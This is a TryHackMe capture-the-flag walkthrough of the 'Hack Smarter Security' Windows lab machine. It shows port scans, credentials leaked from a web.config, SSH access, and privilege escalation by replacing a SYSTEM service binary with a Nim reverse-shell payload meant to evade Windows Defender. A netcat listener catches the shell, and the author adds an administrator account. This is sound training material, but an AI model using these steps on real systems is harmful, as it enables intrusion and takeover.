---
title: Hack Smarter Security
date: '2024-12-30'
category: tryhackme
tags: tryhackme, ctf
description: Detailed technical walkthrough and security analysis for the Hack Smarter
  Security machine on TryHackMe.
slug: hack-smarter-security
---




```
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 06-28-23  02:58PM                 3722 Credit-Cards-We-Pwned.txt
|_06-28-23  03:00PM              1022126 stolen-passport.png
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 0d:fa:da:de:c9:dd:99:8d:2e:8e:eb:3b:93:ff:e2:6c (RSA)
|   256 5d:0c:df:32:26:d3:71:a2:8e:6e:9a:1c:43:fc:1a:03 (ECDSA)
|_  256 c4:25:e7:09:d6:c9:d9:86:5f:6e:8a:8b:ec:13:4a:8b (ED25519)
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=hack.thm
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://hack.thm:80/contact.html
|     Form id: 
|_    Form action: 
| http-methods: 
|_  Potentially risky methods: TRACE
| http-fileupload-exploiter: 
|   
|     Couldn't find a file-type field.
|   
|     Couldn't find a file-type field.
|   
|     Couldn't find a file-type field.
|   
|     Couldn't find a file-type field.
|   
|     Couldn't find a file-type field.
|   
|_    Couldn't find a file-type field.
|_http-server-header: Microsoft-IIS/10.0
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-title: HackSmarterSec
1311/tcp open  ssl/rxmon?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Strict-Transport-Security: max-age=0
|     X-Frame-Options: SAMEORIGIN
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     vary: accept-encoding
|     Content-Type: text/html;charset=UTF-8
|     Date: Sat, 08 Nov 2025 10:57:45 GMT
|     Connection: close
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
|     <html>
|     <head>
|     <META http-equiv="Content-Type" content="text/html; charset=UTF-8">
|     <title>OpenManage&trade;</title>
|     <link type="text/css" rel="stylesheet" href="/oma/css/loginmaster.css">
|     <style type="text/css"></style>
|     <script type="text/javascript" src="/oma/js/prototype.js" language="javascript"></script><script type="text/javascript" src="/oma/js/gnavbar.js" language="javascript"></script><script type="text/javascript" src="/oma/js/Clarity.js" language="javascript"></script><script language="javascript">
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Strict-Transport-Security: max-age=0
|     X-Frame-Options: SAMEORIGIN
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     vary: accept-encoding
|     Content-Type: text/html;charset=UTF-8
|     Date: Sat, 08 Nov 2025 10:57:56 GMT
|     Connection: close
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
|     <html>
|     <head>
|     <META http-equiv="Content-Type" content="text/html; charset=UTF-8">
|     <title>OpenManage&trade;</title>
|     <link type="text/css" rel="stylesheet" href="/oma/css/loginmaster.css">
|     <style type="text/css"></style>
|_    <script type="text/javascript" src="/oma/js/prototype.js" language="javascript"></script><script type="text/javascript" src="/oma/js/gnavbar.js" language="javascript"></script><script type="text/javascript" src="/oma/js/Clarity.js" language="javascript"></script><script language="javascript">
| ssl-cert: Subject: commonName=hacksmartersec/organizationName=Dell Inc/stateOrProvinceName=TX/countryName=US
| Not valid before: 2023-06-30T19:03:17
|_Not valid after:  2025-06-29T19:03:17
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=hacksmartersec
| Not valid before: 2025-11-07T10:54:28
|_Not valid after:  2026-05-09T10:54:28
|_ssl-date: 2025-11-08T11:26:31+00:00; -1s from scanner time.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1311-TCP:V=7.95%T=SSL%I=7%D=11/8%Time=690F222A%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,1089,"HTTP/1\.1\x20200\x20\r\nStrict-Transport-Security:
SF:\x20max-age=0\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Content-Type-Optio
SF:ns:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nvary:\x20acc
SF:ept-encoding\r\nContent-Type:\x20text/html;charset=UTF-8\r\nDate:\x20Sa
SF:t,\x2008\x20Nov\x202025\x2010:57:45\x20GMT\r\nConnection:\x20close\r\n\
SF:r\n<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20Str
SF:ict//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-strict\.dtd\">\
SF:r\n<html>\r\n<head>\r\n<META\x20http-equiv=\"Content-Type\"\x20content=
SF:\"text/html;\x20charset=UTF-8\">\r\n<title>OpenManage&trade;</title>\r\
SF:n<link\x20type=\"text/css\"\x20rel=\"stylesheet\"\x20href=\"/oma/css/lo
SF:ginmaster\.css\">\r\n<style\x20type=\"text/css\"></style>\r\n<script\x2
SF:0type=\"text/javascript\"\x20src=\"/oma/js/prototype\.js\"\x20language=
SF:\"javascript\"></script><script\x20type=\"text/javascript\"\x20src=\"/o
SF:ma/js/gnavbar\.js\"\x20language=\"javascript\"></script><script\x20type
SF:=\"text/javascript\"\x20src=\"/oma/js/Clarity\.js\"\x20language=\"javas
SF:cript\"></script><script\x20language=\"javascript\">\r\n\x20")%r(HTTPOp
SF:tions,1089,"HTTP/1\.1\x20200\x20\r\nStrict-Transport-Security:\x20max-a
SF:ge=0\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Content-Type-Options:\x20no
SF:sniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nvary:\x20accept-encod
SF:ing\r\nContent-Type:\x20text/html;charset=UTF-8\r\nDate:\x20Sat,\x2008\
SF:x20Nov\x202025\x2010:57:56\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCT
SF:YPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20Strict//EN\"
SF:\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-strict\.dtd\">\r\n<html>
SF:\r\n<head>\r\n<META\x20http-equiv=\"Content-Type\"\x20content=\"text/ht
SF:ml;\x20charset=UTF-8\">\r\n<title>OpenManage&trade;</title>\r\n<link\x2
SF:0type=\"text/css\"\x20rel=\"stylesheet\"\x20href=\"/oma/css/loginmaster
SF:\.css\">\r\n<style\x20type=\"text/css\"></style>\r\n<script\x20type=\"t
SF:ext/javascript\"\x20src=\"/oma/js/prototype\.js\"\x20language=\"javascr
SF:ipt\"></script><script\x20type=\"text/javascript\"\x20src=\"/oma/js/gna
SF:vbar\.js\"\x20language=\"javascript\"></script><script\x20type=\"text/j
SF:avascript\"\x20src=\"/oma/js/Clarity\.js\"\x20language=\"javascript\"><
SF:/script><script\x20language=\"javascript\">\r\n\x20");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows


```

```
nikto -url http://hack.thm
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.201.107.42
+ Target Hostname:    hack.thm
+ Target Port:        80
+ Start Time:         2025-11-08 06:11:08 (GMT-5)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/10.0
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options

```

```
file > \inetpub\wwwroot\hacksmartersec\web.config
Reading contents of \inetpub\wwwroot\hacksmartersec\web.config:
<configuration>
  <appSettings>
    <add key="Username" value="tyler" />
    <add key="Password" value="IAmA1337h4x0randIkn0wit!" />
  </appSettings>
  <location path="web.config">
    <system.webServer>
      <security>
        <authorization>
          <deny users="*" />
        </authorization>
      </security>
    </system.webServer>
  </location>
</configuration>



```

```
└─$ ssh tyler@10.201.107.42
The authenticity of host '10.201.107.42 (10.201.107.42)' can't be established.
ED25519 key fingerprint is SHA256:MvevGrInODrfb/nv+rYdT743Q0BOkhOmNo5qlrhXCUg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.201.107.42' (ED25519) to the list of known hosts.
tyler@10.201.107.42's password: 

```


> after success I  go into Desktop path found user.txt

```
tyler@HACKSMARTERSEC C:\Users\tyler\Desktop>dir 
 Volume in drive C has no label. 
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\tyler\Desktop

06/30/2023  07:12 PM    <DIR>          .
06/30/2023  07:12 PM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
06/27/2023  09:42 AM                25 user.txt
               3 File(s)          1,106 bytes
               2 Dir(s)  14,088,474,624 bytes free


tyler@HACKSMARTERSEC C:\Users\tyler\Desktop>type user.txtr 
The system cannot find the file specified. 

tyler@HACKSMARTERSEC C:\Users\tyler\Desktop>type user.txt

```

```
PS C:\OpenManage> sc.exe qc spoofer-scheduler
[SC] QueryServiceConfig SUCCESS 

SERVICE_NAME: spoofer-scheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files (x86)\Spoofer\spoofer-scheduler.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Spoofer Scheduler
        DEPENDENCIES       : tcpip
        SERVICE_START_NAME : LocalSystem
PS C:\OpenManage>

```

```
     53       7     1596       4440              4040   0 spoofer-scheduler  
```

> use nim payload to bypass windows defender

```
nim C -d:mingw --app:gui --opt:speed -o:spoofer-scheduler.exe rev.nim

```

> get that to victim machine and start so can get another reverse shell with administrators privisec


```
└─$ nc -nvlp 8080                               
listening on [any] 8080 ...
connect to [10.21.16.42] from (UNKNOWN) [10.201.
C:\Windows\system32> net user luke P@ssw0rd!123 
net localgroup "Administrators" luke /addThe comy.


C:\Windows\system32> The command completed succe

C:\Windows\system32>
```

> after adding usr to that administrators group login wia ssh and get txt

```
PS C:\Users\Administrator> cd Desktop
PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        6/30/2023   6:40 PM                Hacking-Targets
-a----        6/21/2016   3:36 PM            527 EC2 Feedback.website
-a----        6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website


PS C:\Users\Administrator\Desktop> cd Hacking-Targets
PS C:\Users\Administrator\Desktop\Hacking-Targets> ls


    Directory: C:\Users\Administrator\Desktop\Hacking-Targets


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/27/2023   9:40 AM             53 hacking-targets.txt


PS C:\Users\Administrator\Desktop\Hacking-Targets> cat hacking-targets.txt
```